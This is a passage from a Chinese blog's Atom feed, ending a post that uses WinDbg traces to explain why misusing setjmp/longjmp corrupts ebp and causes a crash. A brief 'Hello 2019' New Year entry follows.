下内存读写断点，该断点只会命中一次（在变量被初始化为 <code>0</code> 的时候）。理论上来说，进入函数 <code>bar</code> 时，传入的参数 <code>value</code> 的值应该总是 <code>0</code> ，但是实际上并非如此，而且我们在 <code>foo</code> 函数中下的内存断点也无法监控到 <code>value</code> 的值的<strong><em>改变</em></strong>，在 WinDbg 中可以进行验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$$ 分别给两个函数下断点</span><br><span class="line">0:000&gt; bu Test!foo</span><br><span class="line">0:000&gt; bu Test!bar</span><br><span class="line"></span><br><span class="line">$$ 继续运行被调试程序，等待第一个断点命中，进入 foo 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a0 esp=00eff838 ebp=00eff880 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo:</span><br><span class="line">00b010a0 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 等待栈帧建立完毕</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a1 esp=00eff834 ebp=00eff880 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo+0x1:</span><br><span class="line">00b010a1 8bec            mov     ebp,esp</span><br><span class="line"></span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=012062d0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010a3 esp=00eff834 ebp=00eff834 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">Test!foo+0x3:</span><br><span class="line">00b010a3 83ec48          sub     esp,48h</span><br><span class="line"></span><br><span class="line">$$ 局部变量 value 存放于 ebp-48 处，下内存读写断点监控</span><br><span class="line">0:000&gt; ba w4 ebp-48</span><br><span class="line"></span><br><span class="line">0:000&gt; bl</span><br><span class="line">     0 e Disable Clear  00b010a0     0001 (0001)  0:**** Test!foo</span><br><span class="line">     1 e Disable Clear  00b01040     0001 (0001)  0:**** Test!bar</span><br><span class="line">     2 e Disable Clear  00eff7ec w 4 0001 (0001)  0:**** </span><br><span class="line"></span><br><span class="line">$$ 继续执行，value 初始化时第一次命中内存断点</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=00eff7f0 ebx=00c6c000 ecx=00000000 edx=c7664979 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b010ba esp=00eff7ec ebp=00eff834 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!foo+0x1a:</span><br><span class="line">00b010ba 6a00            push    0</span><br><span class="line"></span><br><span class="line">0:000&gt; ub eip L1</span><br><span class="line">Test!foo+0x13 [c:\users\test\source\repos\test\test\test.cpp @ 27]:</span><br><span class="line">00b010b3 c745b800000000  mov     dword ptr [ebp-48h],0</span><br><span class="line"></span><br><span class="line">$$ 继续执行，第一次命中 bar 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00eff7f0 ebx=00c6c000 ecx=00000000 edx=00eff7f0 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b01040 esp=00eff7e0 ebp=00eff834 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">Test!bar:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 传入的 value 参数的值为 0</span><br><span class="line">0:000&gt; dd esp L3</span><br><span class="line">00eff7e0  00b010f1 00eff7f0 00000000</span><br><span class="line"></span><br><span class="line">$$ 继续执行，第二次命中 bar 函数</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00eff798 ebx=00b010c2 ecx=00000014 edx=00eff7f0 esi=00b19df0 edi=01203948</span><br><span class="line">eip=00b01040 esp=00eff7cc ebp=00eff7dc iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">Test!bar:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line"></span><br><span class="line">$$ 传入的 value 参数的值为 0x20!!!</span><br><span class="line">0:000&gt; dd esp L3</span><br><span class="line">00eff7cc  00b010f1 00eff798 00000020</span><br></pre></td></tr></table></figure><p>的确，这里 <code>ba</code> 内存断点只命中了一次，但是第二次命中 <code>bar</code> 函数时，参数 <code>value</code> 的值却改变了，难道这是 WinDbg 的 Bug 吗？事实上并不是，而是 <code>bar</code> 函数中直接跳转到 <code>jmp_buf</code> 中的 <code>eip</code> 的写法是有问题的！</p><p>当从 <code>foo</code> 进入 <code>bar</code> 时，<code>bar</code> 函数也会建立栈帧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u Test!bar</span><br><span class="line">Test!bar [c:\users\test\source\repos\test\test\test.cpp @ 7]:</span><br><span class="line">00b01040 55              push    ebp</span><br><span class="line">00b01041 8bec            mov     ebp,esp</span><br></pre></td></tr></table></figure><p>而之后在 <code>bar</code> 函数中又直接跳转到 <code>jmp_buf</code> 中的 <code>eip</code> ，此时 <code>esp</code> 和 <code>ebp</code> 寄存器的值没有被恢复，就直接回到了 <code>foo</code> 函数中。因为局部变量 <code>value</code> 是基于 <code>ebp</code> 进行定位的，而此时 <code>ebp</code> 的值已经变了，以至于 <code>foo</code> 再次调用 <code>bar</code> 时，<code>value</code> 不再是原来的 <code>value</code> ，而内存断点监控的仍然是原来存放 <code>value</code> 变量的地址（原有地址上的值也并未改变），因此自然不会再次命中，也无法监控到 <code>value</code> 的值的<strong><em>改变</em></strong> （改变只是由于 <code>ebp</code> 发生了变化从而读取到了栈上存储的其他值）。</p><p>同样，<code>bar</code> 函数的第一个参数 <code>env</code> 所存储的值也会因为 <code>foo</code> 函数中 <code>ebp</code> 的变化而变化，当传递一个非法的 <code>env</code> 给 <code>longjmp</code> 时，进程直接 Crash 掉了。</p><p>本小节给出的示例程序，完全是 <code>setjmp</code> 和 <code>longjmp</code> 的一种错误用法，这两个函数应该配套使用，而不应该在中间某个地方直接通过 <code>jmp</code> 或者 <code>call</code> 来跳转到 <code>setjmp</code> 之后的位置。这里给出的示例程序是实际调试过程中遇到的问题的一个简化模型，仅供调试学习之用，读者切勿模仿这里的错误写法。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>本文通过分析一个 Crash 学习了 <code>setjmp</code> 和 <code>longjmp</code> 的基本用法，并分析清楚了造成 Crash 的根本原因。</p><p>除了异常处理之外， <code>setjmp</code> 和 <code>longjmp</code> 还有一些其他场合的应用，比如实现 <a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E7%A8%8B#%E7%94%A8C%E7%9A%84%E5%AE%9E%E7%8E%B0" target="_blank" rel="noopener">协程</a> 等，具体可以参考 <a href="https://stackoverflow.com/questions/14685406/practical-usage-of-setjmp-and-longjmp-in-c" target="_blank" rel="noopener">StackOverflow</a> 上的提问。</p><p>最后，基于 <code>setjmp</code> 和 <code>longjmp</code> 还可以实现一定程度的代码混淆（反分析、反调试），这个问题留给读者自行思考和实践。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-问题描述&quot;&gt;&lt;a href=&quot;#0x01-问题描述&quot; class=&quot;headerlink&quot; title=&quot;0x01. 问题描述&quot;&gt;&lt;/a&gt;0x01. 问题描述&lt;/h2&gt;&lt;p&gt;周末在测试一个程序时，发现其莫名其妙的 Crash 在了一个系统自带 DLL 的某个函数里面，而且很难直观地看出来 Crash 的原因，分析之后发现是不当使用 C 语言 &lt;code&gt;setjmp&lt;/code&gt; 和 &lt;code&gt;longjmp&lt;/code&gt; 两个函数导致的。那么这和文章标题有什么联系呢？笔者在分析的过程中使用了 WinDbg 的内存断点（ Processor Breakpoint / Data Breakpoint ）来跟踪一个栈变量的读写操作，理论上这个断点会多次命中，但实际上只命中了一次，而这个现象正是由于不当使用 &lt;code&gt;setjmp&lt;/code&gt; 和 &lt;code&gt;longjmp&lt;/code&gt; 导致 &lt;code&gt;esp&lt;/code&gt; 和 &lt;code&gt;ebp&lt;/code&gt; 寄存器的值的非预期改变所导致的。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="WinDbg" scheme="http://programlife.net/tags/WinDbg/"/>
    
      <category term="内存断点" scheme="http://programlife.net/tags/%E5%86%85%E5%AD%98%E6%96%AD%E7%82%B9/"/>
    
      <category term="setjmp" scheme="http://programlife.net/tags/setjmp/"/>
    
      <category term="longjmp" scheme="http://programlife.net/tags/longjmp/"/>
    
  </entry>
  
  <entry>
    <title>Hello 2019</title>
    <link href="http://programlife.net/2019/01/01/hello-2019/"/>
    <id>http://programlife.net/2019/01/01/hello-2019/</id>
    <published>2019-01-01T15:12:44.000Z</published>
    <updated>2019-01-01T15:34:39.040Z</updated>
    
    <content type="html"><![CDATA[<p>May you always have beginner’s mind.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;May you always have beginner’s mind.&lt;/p&gt;

      
    
    </summary>
    
      <category term="Default" scheme="http://programlife.net/categories/Default/"/>
    
    
      <category term="New Year" scheme="http://programlife.net/tags/New-Year/"/>
    
  </entry>
  
</feed>
